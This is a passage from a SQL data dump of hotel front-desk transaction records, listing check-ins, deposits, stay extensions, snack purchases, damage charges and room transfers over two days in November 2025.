10:36:20'),(113,1,205,16,5,6,'\"[1,\\\"Tan\\\"]\"','Extension',200,200,0,0,'2025-11-20 10:38:45',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-20 10:38:13','2025-11-20 10:38:45'),(114,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',200,200,0,0,'2025-11-20 10:38:45',NULL,'Cashout from paying deposit (Extension)',NULL,0,'2025-11-20 10:38:45','2025-11-20 10:38:45'),(115,1,205,16,5,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',120,120,0,0,'2025-11-20 10:40:05',NULL,'Guest Added Food and Beverages: (Front Desk) (8) Coke Zero',NULL,0,'2025-11-20 10:39:24','2025-11-20 10:40:05'),(116,1,205,16,5,2,'\"[1,\\\"Tan\\\"]\"','Deposit',13,0,0,13,'2025-11-20 10:39:58',NULL,'Guest Deposit:  trsdgdfg',NULL,0,'2025-11-20 10:39:58','2025-11-20 10:39:58'),(117,1,205,16,5,5,'\"[1,\\\"Tan\\\"]\"','Cashout',120,120,0,0,'2025-11-20 10:40:05',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 10:40:05','2025-11-20 10:40:05'),(118,1,205,16,5,6,'\"[1,\\\"Tan\\\"]\"','Extension',648,0,0,0,'2025-11-20 10:58:02',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-20 10:45:32','2025-11-20 10:58:02'),(119,1,205,16,5,6,'\"[1,\\\"Tan\\\"]\"','Extension',100,0,0,0,'2025-11-20 10:58:02',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 10:46:03','2025-11-20 10:58:02'),(120,1,209,17,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',760,1000,240,0,'2025-11-20 10:55:17',NULL,'Guest Checked In at room #119',NULL,0,'2025-11-20 10:55:17','2025-11-20 10:55:17'),(121,1,209,17,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,1000,240,200,'2025-11-20 10:55:17',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 10:55:17','2025-11-20 10:55:17'),(122,1,209,17,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',240,1000,0,240,'2025-11-20 10:55:17',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-20 10:55:17','2025-11-20 10:55:17'),(123,1,3,18,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',592,600,8,0,'2025-11-20 10:55:52',NULL,'Guest Checked In at room #11',NULL,0,'2025-11-20 10:55:52','2025-11-20 10:55:52'),(124,1,3,18,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,600,8,200,'2025-11-20 10:55:52',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 10:55:52','2025-11-20 10:55:52'),(125,1,3,18,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',8,600,0,8,'2025-11-20 10:55:52',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-20 10:55:52','2025-11-20 10:55:52'),(126,1,209,17,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',30,0,0,0,'2025-11-20 10:58:18',NULL,'Guest Added Food and Beverages: (Front Desk) (3) Chippy',NULL,0,'2025-11-20 10:57:54','2025-11-20 10:58:18'),(127,1,209,17,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',30,30,0,0,'2025-11-20 10:58:18',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 10:58:18','2025-11-20 10:58:18'),(128,1,209,17,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',210,0,0,210,'2025-11-20 11:00:09',NULL,'Guest Deduction of Deposit: ₱210 deducted.',NULL,0,'2025-11-20 11:00:09','2025-11-20 11:00:09'),(129,1,17,19,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',536,1000,464,0,'2025-11-20 11:10:24',NULL,'Guest Checked In at room #25',NULL,0,'2025-11-20 11:10:24','2025-11-20 11:10:24'),(130,1,17,19,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,1000,464,200,'2025-11-20 11:10:24',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 11:10:24','2025-11-20 11:10:24'),(131,1,17,19,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',464,1000,0,464,'2025-11-20 11:10:24',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-20 11:10:24','2025-11-20 11:10:24'),(132,1,6,20,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',592,592,0,0,'2025-11-20 11:10:53',NULL,'Guest Checked In at room #15',NULL,0,'2025-11-20 11:10:53','2025-11-20 11:10:53'),(133,1,6,20,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,592,0,200,'2025-11-20 11:10:53',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 11:10:53','2025-11-20 11:10:53'),(134,1,127,21,4,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',872,900,28,0,'2025-11-20 11:11:19',NULL,'Guest Checked In at room #200',NULL,0,'2025-11-20 11:11:19','2025-11-20 11:11:19'),(135,1,127,21,4,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,900,28,200,'2025-11-20 11:11:19',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 11:11:19','2025-11-20 11:11:19'),(136,1,17,19,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',30,0,0,0,'2025-11-20 11:14:13',NULL,'Guest Added Food and Beverages: (Front Desk) (2) Coke Zero',NULL,0,'2025-11-20 11:13:51','2025-11-20 11:14:13'),(137,1,17,19,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',20,0,0,0,'2025-11-20 11:14:13',NULL,'Guest Added Food and Beverages: (Front Desk) (2) Chippy',NULL,0,'2025-11-20 11:14:01','2025-11-20 11:14:13'),(138,1,17,19,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',50,50,0,0,'2025-11-20 11:14:13',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 11:14:13','2025-11-20 11:14:13'),(139,1,3,18,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',492,0,0,0,NULL,NULL,'Guest Extension : 18 hours',NULL,0,'2025-11-20 11:15:55','2025-11-20 11:15:55'),(140,1,17,19,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',414,0,0,414,'2025-11-20 11:15:56',NULL,'Guest Deduction of Deposit: ₱414 deducted.',NULL,0,'2025-11-20 11:15:56','2025-11-20 11:15:56'),(141,1,33,21,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,NULL,NULL,'Guest Transfered from Room #200 (Twin size Bed) to Room #4 (Single size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 11:16:18','2025-11-20 11:16:18'),(142,1,3,18,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',270,270,0,0,'2025-11-20 11:29:36',NULL,'Guest Added Food and Beverages: (Front Desk) (9) Nissin Cup Noodles',NULL,0,'2025-11-20 11:21:33','2025-11-20 11:29:36'),(143,1,3,18,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-20 11:22:09',NULL,'Guest Deposit: snacks\n',NULL,0,'2025-11-20 11:22:09','2025-11-20 11:22:09'),(144,1,6,20,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',500,0,0,500,'2025-11-20 11:23:08',NULL,'Guest Deposit: extras',NULL,0,'2025-11-20 11:23:08','2025-11-20 11:23:08'),(145,1,6,20,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',150,0,0,0,'2025-11-20 11:24:13',NULL,'Guest Charged for Damage: (1) SUGA SA ROOM',NULL,0,'2025-11-20 11:23:21','2025-11-20 11:24:13'),(146,1,162,21,4,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,NULL,NULL,'Guest Transfered from Room #4 (Single size Bed) to Room #236 ( Double size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 11:23:43','2025-11-20 11:23:43'),(147,1,6,20,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',40,40,0,0,'2025-11-20 11:23:47',NULL,'Guest Charged for Damage: (1) RUG/ TRAPO SA SALOG',NULL,0,'2025-11-20 11:23:43','2025-11-20 11:23:47'),(148,1,6,20,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',40,40,0,0,'2025-11-20 11:23:47',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 11:23:47','2025-11-20 11:23:47'),(149,1,6,20,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',150,150,0,0,'2025-11-20 11:24:13',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-20 11:24:13','2025-11-20 11:24:13'),(150,1,15,21,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,NULL,NULL,'Guest Transfered from Room #236 ( Double size Bed) to Room #23 (Twin size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 11:25:27','2025-11-20 11:25:27'),(151,1,10,20,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 12:57:40',NULL,'Guest Transfered from Room #15 ( Double size Bed) to Room #19 (Twin size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 11:27:36','2025-11-20 12:57:40'),(152,1,10,20,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 12:57:40',NULL,'Guest Transfered from Room #19 (Twin size Bed) to Room #19 (Twin size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 11:28:04','2025-11-20 12:57:40'),(153,1,3,18,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',270,270,0,0,'2025-11-20 11:29:36',NULL,'Cashout from paying deposit (Food and Beverages)',NULL,0,'2025-11-20 11:29:36','2025-11-20 11:29:36'),(154,1,15,21,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',772,800,28,28,'2025-11-20 12:05:09',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 12:01:54','2025-11-20 12:05:09'),(155,1,2,20,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 12:57:40',NULL,'Guest Transfered from Room #19 (Twin size Bed) to Room #10 ( Double size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 12:02:09','2025-11-20 12:57:40'),(156,1,2,20,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 12:57:40',NULL,'Guest Transfered from Room #10 ( Double size Bed) to Room #10 ( Double size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 12:02:50','2025-11-20 12:57:40'),(157,1,2,20,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',310,0,0,310,'2025-11-20 12:05:41',NULL,'Guest Deduction of Deposit: ₱310 deducted.',NULL,0,'2025-11-20 12:05:41','2025-11-20 12:05:41'),(158,1,15,21,1,8,'\"[1,\\\"Tan\\\"]\"','Amenities',200,200,0,0,'2025-11-20 15:37:44',NULL,'Guest Added Amenities: (2) EXTRA PERSON WITH FREE PILLOW, BLANKET,TOWEL',NULL,0,'2025-11-20 12:54:58','2025-11-20 15:37:44'),(159,1,15,21,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',450,500,50,50,'2025-11-20 15:37:59',NULL,'Guest Added Food and Beverages: (Front Desk) (30) Coke Zero',NULL,0,'2025-11-20 12:55:40','2025-11-20 15:37:59'),(160,1,2,20,1,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',2460,0,0,0,'2025-11-20 12:57:40',NULL,'Guest Added Food and Beverages: (Front Desk) (82) Nissin Cup Noodles',NULL,0,'2025-11-20 12:56:29','2025-11-20 12:57:40'),(161,1,15,21,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',500,500,0,0,'2025-11-20 14:23:55',NULL,'Guest Charged for Damage: (1) HABOL',NULL,0,'2025-11-20 12:57:39','2025-11-20 14:23:55'),(162,1,15,21,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',200,200,0,0,'2025-11-20 14:23:02',NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-20 12:58:00','2025-11-20 14:23:02'),(163,1,2,20,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',100,0,0,0,'2025-11-20 12:58:32',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 12:58:17','2025-11-20 12:58:32'),(164,1,2,20,1,6,'\"[1,\\\"Tan\\\"]\"','Extension',100,0,0,0,'2025-11-20 12:58:58',NULL,'Guest Extension : 6 hours',NULL,0,'2025-11-20 12:58:54','2025-11-20 12:58:58'),(165,1,172,22,5,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',760,760,0,0,'2025-11-20 13:19:32',NULL,'Guest Checked In at room #257',NULL,0,'2025-11-20 13:19:32','2025-11-20 13:19:32'),(166,1,172,22,5,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,760,0,200,'2025-11-20 13:19:32',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 13:19:32','2025-11-20 13:19:32'),(167,1,23,25,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',560,0,0,0,'2025-11-20 14:10:58',NULL,'Guest C/O Checked In at room #30',NULL,1,'2025-11-20 14:10:58','2025-11-20 14:10:58'),(168,1,23,25,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',0,0,0,0,'2025-11-20 14:10:58',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,1,'2025-11-20 14:10:58','2025-11-20 14:10:58'),(169,1,1,24,1,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',480,480,0,0,'2025-11-20 14:11:29',NULL,'Guest Checked In at room #1',NULL,0,'2025-11-20 14:11:29','2025-11-20 14:11:29'),(170,1,1,24,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,480,0,200,'2025-11-20 14:11:29',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 14:11:29','2025-11-20 14:11:29'),(171,1,15,21,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',500,0,0,500,'2025-11-20 14:23:40',NULL,'Guest Deposit: asaasas',NULL,0,'2025-11-20 14:23:40','2025-11-20 14:23:40'),(172,1,15,21,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',500,500,0,0,'2025-11-20 14:23:55',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 14:23:55','2025-11-20 14:23:55'),(173,1,44,25,2,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',56,56,0,0,'2025-11-20 16:07:45',NULL,'Guest Transfered from Room #30 (Single size Bed) to Room #101 ( Double size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 14:23:56','2025-11-20 16:07:45'),(174,1,1,24,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-20 14:27:38',NULL,'Guest Deposit: snacks',NULL,0,'2025-11-20 14:27:38','2025-11-20 14:27:38'),(175,1,1,24,1,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',1000,1000,0,0,'2025-11-20 14:44:24',NULL,'Guest Charged for Damage: (1) SAMIN SULOD SA ROOM',NULL,0,'2025-11-20 14:44:11','2025-11-20 14:44:24'),(176,1,1,24,1,5,'\"[1,\\\"Tan\\\"]\"','Cashout',1000,1000,0,0,'2025-11-20 14:44:24',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 14:44:24','2025-11-20 14:44:24'),(177,1,1,24,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',2002,0,0,2002,'2025-11-20 14:45:18',NULL,'Guest Deposit: change ah',NULL,0,'2025-11-20 14:45:18','2025-11-20 14:45:18'),(178,1,89,24,3,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,NULL,NULL,'Guest Transfered from Room #1 ( Double size Bed) to Room #124 (Twin size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 14:46:15','2025-11-20 14:46:15'),(179,1,89,24,3,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',5000,5000,0,0,'2025-11-20 14:50:32',NULL,'Guest Charged for Damage: (1) MAIN DOOR',NULL,0,'2025-11-20 14:48:12','2025-11-20 14:50:32'),(180,1,89,24,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',4000,0,0,4000,'2025-11-20 14:49:29',NULL,'Guest Deposit: cash',NULL,0,'2025-11-20 14:49:29','2025-11-20 14:49:29'),(181,1,89,24,3,5,'\"[1,\\\"Tan\\\"]\"','Cashout',5000,5000,0,0,'2025-11-20 14:50:32',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 14:50:32','2025-11-20 14:50:32'),(182,1,89,24,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-20 14:51:15',NULL,'Guest Deposit: asfas',NULL,0,'2025-11-20 14:51:15','2025-11-20 14:51:15'),(183,1,89,24,3,4,'\"[1,\\\"Tan\\\"]\"','Damage Charges',1000,1000,0,0,'2025-11-20 14:53:08',NULL,'Guest Charged for Damage: (1) SAMIN SULOD SA ROOM',NULL,0,'2025-11-20 14:52:46','2025-11-20 14:53:08'),(184,1,89,24,3,5,'\"[1,\\\"Tan\\\"]\"','Cashout',1000,1000,0,0,'2025-11-20 14:53:08',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 14:53:08','2025-11-20 14:53:08'),(185,1,89,24,3,5,'\"[1,\\\"Tan\\\"]\"','Cashout',1000,1000,0,0,'2025-11-20 14:53:08',NULL,'Cashout from paying deposit (Damage Charges)',NULL,0,'2025-11-20 14:53:08','2025-11-20 14:53:08'),(186,1,89,24,3,2,'\"[1,\\\"Tan\\\"]\"','Deposit',1000,0,0,1000,'2025-11-20 14:55:18',NULL,'Guest Deposit: sdf',NULL,0,'2025-11-20 14:55:18','2025-11-20 14:55:18'),(187,1,89,24,3,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',50,0,0,0,NULL,NULL,'Guest Added Food and Beverages: (Front Desk) (5) Chippy',NULL,0,'2025-11-20 14:55:42','2025-11-20 14:55:42'),(188,1,89,24,3,8,'\"[1,\\\"Tan\\\"]\"','Amenities',60,0,0,0,NULL,NULL,'Guest Added Amenities: (3) EXTRA TOWEL',NULL,0,'2025-11-20 14:56:10','2025-11-20 14:56:10'),(189,1,89,24,3,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',75,0,0,0,NULL,NULL,'Guest Added Food and Beverages: (Front Desk) (5) Nature\'s Spring 10ML',NULL,0,'2025-11-20 15:01:36','2025-11-20 15:01:36'),(190,1,89,24,3,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',60,60,0,0,'2025-11-20 15:28:36',NULL,'Guest Added Food and Beverages: (Front Desk) (4) Nature\'s Spring 10ML',NULL,0,'2025-11-20 15:28:23','2025-11-20 15:28:36'),(191,1,89,24,3,9,'\"[1,\\\"Tan\\\"]\"','Food and Beverages',60,60,0,0,'2025-11-20 15:29:26',NULL,'Guest Added Food and Beverages: (Front Desk) (4) Nature\'s Spring 10ML',NULL,0,'2025-11-20 15:29:18','2025-11-20 15:29:26'),(192,1,15,21,1,2,'\"[1,\\\"Tan\\\"]\"','Deposit',50,50,0,0,'2025-11-20 15:37:59',NULL,'Deposit from paying Food and Beverages',NULL,0,'2025-11-20 15:37:59','2025-11-20 15:37:59'),(193,1,49,22,2,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,NULL,NULL,'Guest Transfered from Room #257 (Single size Bed) to Room #64 (Single size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 15:49:25','2025-11-20 15:49:25'),(194,1,34,25,1,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,'2025-11-20 16:07:45',NULL,'Guest Transfered from Room #101 ( Double size Bed) to Room #5 (Single size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 16:07:39','2025-11-20 16:07:45'),(195,1,48,26,2,1,'\"[1,\\\"Tan\\\"]\"','Guest Check In',424,500,76,0,'2025-11-20 16:09:44',NULL,'Guest Checked In at room #63',NULL,0,'2025-11-20 16:09:44','2025-11-20 16:09:44'),(196,1,48,26,2,2,'\"[1,\\\"Tan\\\"]\"','Deposit',200,500,76,200,'2025-11-20 16:09:44',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-20 16:09:44','2025-11-20 16:09:44'),(197,1,88,26,3,7,'\"[1,\\\"Tan\\\"]\"','Room Transfer',0,0,0,0,NULL,NULL,'Guest Transfered from Room #63 (Single size Bed) to Room #123 (Single size Bed) - Reason: Guba Aircon ',1,0,'2025-11-20 16:10:32','2025-11-20 16:10:32'),(198,1,207,27,3,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',872,872,0,0,'2025-11-21 20:33:42',NULL,'Guest Checked In at room #108',NULL,0,'2025-11-21 20:33:42','2025-11-21 20:33:42'),(199,1,207,27,3,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,872,0,200,'2025-11-21 20:33:42',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 20:33:42','2025-11-21 20:33:42'),(200,1,207,27,3,6,'\"[2,\\\"Bhong\\\"]\"','Extension',1172,1172,0,0,'2025-11-21 20:44:41',NULL,'Guest Extension : 24 hours',NULL,0,'2025-11-21 20:34:30','2025-11-21 20:44:41'),(201,1,207,27,3,4,'\"[2,\\\"Bhong\\\"]\"','Damage Charges',500,500,0,0,'2025-11-21 20:44:41',NULL,'Guest Charged for Damage: (1) HABOL',NULL,0,'2025-11-21 20:44:38','2025-11-21 20:44:41'),(202,1,208,28,2,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',760,1260,500,0,'2025-11-21 20:49:09',NULL,'Guest Checked In at room #117',NULL,0,'2025-11-21 20:49:09','2025-11-21 20:49:09'),(203,1,208,28,2,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1260,500,200,'2025-11-21 20:49:09',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 20:49:09','2025-11-21 20:49:09'),(204,1,208,28,2,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',500,1260,0,500,'2025-11-21 20:49:09',NULL,'Deposit From Check In (Excess Amount)',NULL,0,'2025-11-21 20:49:09','2025-11-21 20:49:09'),(205,1,208,28,2,9,'\"[2,\\\"Bhong\\\"]\"','Food and Beverages',15,15,0,0,'2025-11-21 20:49:30',NULL,'Guest Added Food and Beverages: (Front Desk) (1) Nature\'s Spring 10ML',NULL,0,'2025-11-21 20:49:26','2025-11-21 20:49:30'),(206,1,208,28,2,6,'\"[2,\\\"Bhong\\\"]\"','Extension',1060,1060,0,0,'2025-11-21 20:50:03',NULL,'Guest Extension : 24 hours',NULL,0,'2025-11-21 20:50:00','2025-11-21 20:50:03'),(207,1,208,28,2,5,'\"[2,\\\"Bhong\\\"]\"','Cashout',500,0,0,500,'2025-11-21 20:51:10',NULL,'Guest Deduction of Deposit: ₱500 deducted.',NULL,0,'2025-11-21 20:51:10','2025-11-21 20:51:10'),(208,1,208,28,2,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',500,0,0,500,'2025-11-21 20:51:16',NULL,'Guest Deposit: Change',NULL,0,'2025-11-21 20:51:16','2025-11-21 20:51:16'),(209,1,209,29,1,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',536,536,0,0,'2025-11-21 20:53:54',NULL,'Guest Checked In at room #119',NULL,0,'2025-11-21 20:53:54','2025-11-21 20:53:54'),(210,1,209,29,1,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,536,0,200,'2025-11-21 20:53:54',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 20:53:54','2025-11-21 20:53:54'),(211,1,209,29,1,6,'\"[2,\\\"Bhong\\\"]\"','Extension',200,0,0,0,NULL,NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-21 20:54:10','2025-11-21 20:54:10'),(212,1,209,29,1,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',1000,0,0,1000,'2025-11-21 20:54:23',NULL,'Guest Deposit: Food',NULL,0,'2025-11-21 20:54:23','2025-11-21 20:54:23'),(213,1,127,30,4,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',648,648,0,0,'2025-11-21 20:57:02',NULL,'Guest Checked In at room #200',NULL,0,'2025-11-21 20:57:02','2025-11-21 20:57:02'),(214,1,127,30,4,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,648,0,200,'2025-11-21 20:57:02',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 20:57:02','2025-11-21 20:57:02'),(215,1,127,30,4,6,'\"[2,\\\"Bhong\\\"]\"','Extension',200,0,0,0,NULL,NULL,'Guest Extension : 12 hours',NULL,0,'2025-11-21 20:57:15','2025-11-21 20:57:15'),(216,1,127,30,4,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',2000,0,0,2000,'2025-11-21 20:57:35',NULL,'Guest Deposit: Food',NULL,0,'2025-11-21 20:57:35','2025-11-21 20:57:35'),(217,1,128,31,4,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',816,1000,184,0,'2025-11-21 20:59:50',NULL,'Guest Checked In at room #201',NULL,0,'2025-11-21 20:59:50','2025-11-21 20:59:50'),(218,1,128,31,4,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1000,184,200,'2025-11-21 20:59:50',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 20:59:50','2025-11-21 20:59:50'),(219,1,128,31,4,6,'\"[2,\\\"Bhong\\\"]\"','Extension',1116,0,0,0,'2025-11-21 21:01:07',NULL,'Guest Extension : 24 hours',NULL,0,'2025-11-21 21:00:09','2025-11-21 21:01:07'),(220,1,128,31,4,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',5000,0,0,5000,'2025-11-21 21:00:21',NULL,'Guest Deposit: Change',NULL,0,'2025-11-21 21:00:21','2025-11-21 21:00:21'),(221,1,128,31,4,9,'\"[2,\\\"Bhong\\\"]\"','Food and Beverages',50,0,0,0,'2025-11-21 21:01:07',NULL,'Guest Added Food and Beverages: (Front Desk) (5) Chippy',NULL,0,'2025-11-21 21:00:44','2025-11-21 21:01:07'),(222,1,128,31,4,5,'\"[2,\\\"Bhong\\\"]\"','Cashout',1166,1166,0,0,'2025-11-21 21:01:07',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-21 21:01:07','2025-11-21 21:01:07'),(223,1,210,32,3,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',816,1000,184,0,'2025-11-21 21:04:31',NULL,'Guest Checked In at room #300',NULL,0,'2025-11-21 21:04:31','2025-11-21 21:04:31'),(224,1,210,32,3,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1000,184,200,'2025-11-21 21:04:31',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:04:31','2025-11-21 21:04:31'),(225,1,210,32,3,6,'\"[2,\\\"Bhong\\\"]\"','Extension',666,0,0,0,'2025-11-21 21:06:36',NULL,'Guest Extension : 3 hours',NULL,0,'2025-11-21 21:06:06','2025-11-21 21:06:36'),(226,1,210,32,3,9,'\"[2,\\\"Bhong\\\"]\"','Food and Beverages',75,0,0,0,'2025-11-21 21:06:36',NULL,'Guest Added Food and Beverages: (Front Desk) (5) Nature\'s Spring 10ML',NULL,0,'2025-11-21 21:06:26','2025-11-21 21:06:36'),(227,1,210,32,3,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',1000,0,0,1000,'2025-11-21 21:06:33',NULL,'Guest Deposit: Food',NULL,0,'2025-11-21 21:06:33','2025-11-21 21:06:33'),(228,1,210,32,3,5,'\"[2,\\\"Bhong\\\"]\"','Cashout',741,741,0,0,'2025-11-21 21:06:36',NULL,'Cashout from paying all unpaid balances',NULL,0,'2025-11-21 21:06:36','2025-11-21 21:06:36'),(229,1,211,33,1,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',536,600,64,0,'2025-11-21 21:19:28',NULL,'Guest Checked In at room #45',NULL,0,'2025-11-21 21:19:28','2025-11-21 21:19:28'),(230,1,211,33,1,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,600,64,200,'2025-11-21 21:19:28',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:19:28','2025-11-21 21:19:28'),(231,1,212,34,1,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',536,600,64,0,'2025-11-21 21:28:29',NULL,'Guest Checked In at room #46',NULL,0,'2025-11-21 21:28:29','2025-11-21 21:28:29'),(232,1,212,34,1,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,600,64,200,'2025-11-21 21:28:29',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:28:29','2025-11-21 21:28:29'),(233,1,35,35,1,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',648,1000,352,0,'2025-11-21 21:30:17',NULL,'Guest Checked In at room #50',NULL,0,'2025-11-21 21:30:17','2025-11-21 21:30:17'),(234,1,35,35,1,2,'\"[2,\\\"Bhong\\\"]\"','Deposit',200,1000,352,200,'2025-11-21 21:30:17',NULL,'Deposit From Check In (Room Key & TV Remote)',NULL,0,'2025-11-21 21:30:17','2025-11-21 21:30:17'),(235,1,213,36,3,1,'\"[2,\\\"Bhong\\\"]\"','Guest Check In',648,1000,352,0,'2025-11-21 